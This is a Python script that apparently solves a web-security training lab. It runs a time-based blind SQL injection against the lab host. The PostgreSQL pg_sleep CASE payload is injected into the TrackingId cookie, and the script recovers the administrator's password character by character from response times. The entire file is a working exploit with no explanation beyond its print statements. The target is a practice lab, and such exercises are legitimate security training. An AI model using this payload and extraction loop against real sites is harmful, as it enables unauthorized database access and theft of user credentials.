import requests
#select case when substring(password,1,1)='a' then pg_sleep(2) else pg_sleep(5) end from users where username = 'administrator' limit 1
character = "abcdefghijklmnopqrstuvwxyz0123456789"
url = "https://0a7f00ce0479b1c780104ed70051008f.web-security-academy.net/filter?category=Pets"

password = ""
for i in range (1, 22):
    for char in character:
        headers = {
            "Host": "0a7f00ce0479b1c780104ed70051008f.web-security-academy.net",
            "Cookie" : f"TrackingId=a' || (select case when substring(password,1,{i})='{password + char}' then pg_sleep(2) else pg_sleep(5) end from users where username = 'administrator' limit 1)--",
            'Content-Length': '0',
            'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Priority': 'u=0, i'
        }
        response = requests.get(url=url, headers=headers).elapsed.total_seconds()
        print("Try: " + f"1, {i}" + ": " + password + char)
        print("Response time: " + str(response))
        if (response < 5):
            password = password + char
            print("Password: " + password)
            break

print("Username: administrator")
print("Password: " + password)
print("Please login to solve the lab!")